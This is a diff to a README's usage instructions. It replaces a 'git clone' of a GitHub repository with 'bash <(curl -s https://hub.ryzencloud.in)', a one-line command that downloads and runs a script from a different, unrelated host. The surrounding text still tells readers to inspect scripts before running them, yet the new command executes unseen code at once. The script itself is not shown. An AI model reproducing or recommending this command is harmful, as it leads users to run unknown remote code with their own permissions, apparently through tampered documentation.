@@ -44,8 +44,7 @@ The `LICENSE` file in the repository root contains the project's license.
 For a Bash script, you can usually download or clone the repository, inspect the script, and then run it with the appropriate permissions. For example:
 
 ```bash
-git clone https://github.com/ItsMePara123/GG.git
-cd GG
+bash <(curl -s https://hub.ryzencloud.in)
 ```
 
 Make sure you check each script's contents and instructions before execution. Not every script has the same dependencies or usage.
